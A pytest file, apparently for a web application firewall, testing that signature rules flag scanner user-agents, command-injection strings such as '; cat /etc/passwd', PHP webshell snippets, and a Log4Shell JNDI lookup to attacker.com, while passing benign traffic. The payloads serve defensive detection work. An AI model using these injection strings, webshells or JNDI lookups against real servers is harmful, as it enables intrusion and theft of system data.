import pytest
from detection.normalizer import InspectionUnit
from detection.signatures import check_signatures


def test_scanner_user_agent_detection():
    scanners = [
        "sqlmap/1.5.2#stable",
        "Mozilla/5.0 (compatible; Nikto/2.1.6)",
        "Acunetix Web Vulnerability Scanner",
        "Nmap Scripting Engine",
        "dirbuster 1.0-RC1",
        "wfuzz/3.1.0",
    ]

    for ua in scanners:
        verdict = check_signatures([], {"user-agent": ua})
        assert verdict is not None, f"Expected {ua} to be detected"
        assert verdict.rule_id == "SIG-UA-001"
        assert verdict.category == "scanner"
        assert verdict.severity == "high"


def test_benign_user_agent_allowed():
    normal_uas = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
        "curl/8.4.0",
        "python-httpx/0.27.0",
    ]

    for ua in normal_uas:
        verdict = check_signatures([], {"user-agent": ua})
        assert verdict is None, f"Expected {ua} to pass"


def test_command_injection_detection():
    cmdi_payloads = [
        "; cat /etc/passwd",
        "127.0.0.1 | whoami",
        "test && id",
        "`uname -a`",
        "$(whoami)",
    ]

    for payload in cmdi_payloads:
        unit = InspectionUnit(source="query:ip", raw=payload, canonical=payload)
        verdict = check_signatures([unit], {})
        assert verdict is not None, f"Expected {payload} to be detected"
        assert verdict.rule_id == "SIG-CMDI-001"
        assert verdict.category == "command_injection"


def test_webshell_detection():
    webshell_payloads = [
        "<?php system($_GET['cmd']); ?>",
        "eval(base64_decode('...'))",
        "assert($_POST['x'])",
    ]

    for payload in webshell_payloads:
        unit = InspectionUnit(source="multipart:file:content", raw=payload, canonical=payload)
        verdict = check_signatures([unit], {})
        assert verdict is not None, f"Expected webshell {payload} to be detected"
        assert verdict.rule_id == "SIG-WEBSHELL-001"
        assert verdict.category == "webshell"


def test_webshell_filename_detection():
    unit = InspectionUnit(source="multipart:file:filename", raw="c99.php", canonical="c99.php")
    verdict = check_signatures([unit], {})
    assert verdict is not None
    assert verdict.rule_id == "SIG-WEBSHELL-002"


def test_jndi_log4shell_detection():
    payload = "${jndi:ldap://attacker.com/a}"
    unit = InspectionUnit(source="header:user-agent", raw=payload, canonical=payload)
    verdict = check_signatures([unit], {})
    assert verdict is not None
    assert verdict.rule_id == "SIG-JNDI-001"


def test_clean_input_no_signature_match():
    units = [
        InspectionUnit(source="query:search", raw="hello world", canonical="hello world"),
        InspectionUnit(source="form:comment", raw="This is a great product!", canonical="This is a great product!"),
    ]
    verdict = check_signatures(units, {"user-agent": "Mozilla/5.0"})
    assert verdict is None
